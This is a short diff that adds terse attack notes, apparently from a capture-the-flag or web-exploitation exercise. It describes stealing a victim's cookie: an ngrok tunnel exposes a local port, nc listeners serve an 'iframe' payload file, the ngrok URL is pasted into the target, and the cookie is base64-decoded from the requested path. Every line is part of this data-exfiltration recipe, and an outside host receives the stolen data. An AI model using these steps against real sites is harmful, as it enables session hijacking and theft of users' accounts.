@@ -1,0 +1,9 @@
+[run server]
+// ngrok http 10000 -> change urls accordingly //
+nc -l 10000 < iframe; nc -l 10000 < iframe;
+
+[paste url]
+https://xxx.ngrok.io
+
+[the cookie]
+echo {#requested-path} | base64 -d
